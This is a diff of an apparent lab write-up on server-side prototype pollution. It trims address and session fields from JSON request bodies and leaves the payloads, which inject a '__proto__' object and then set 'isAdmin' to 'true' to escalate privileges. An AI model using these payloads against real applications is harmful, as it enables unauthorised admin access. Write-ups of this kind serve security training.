@@ -25,12 +25,6 @@ We can attempt to test Server-Side Prototype Pollution by polluting the global `
 
 ```JSON
 {
-	"address_line_1":"Wiener HQ",
-	"address_line_2":"One Wiener Way",
-	"city":"Wienerville",
-	"postcode":"BU1 1RP",
-	"country":"UK",
-	"sessionId":"EDeUr5ViCIS1NfMWDumM95iX6FOWY4OJ",
 	"__proto__":{
 		"foo":"bar"
 	}
@@ -44,12 +38,6 @@ Success, we polluted the prototype. Now we can do stuff like change the `isAdmin
 
 ```json
 {
-	"address_line_1":"Wiener HQ",
-	"address_line_2":"One Wiener Way",
-	"city":"Wienerville",
-	"postcode":"BU1 1RP",
-	"country":"UK",
-	"sessionId":"EDeUr5ViCIS1NfMWDumM95iX6FOWY4OJ",
 	"__proto__":{
 		"foo":"bar",
 		"isAdmin":"true"
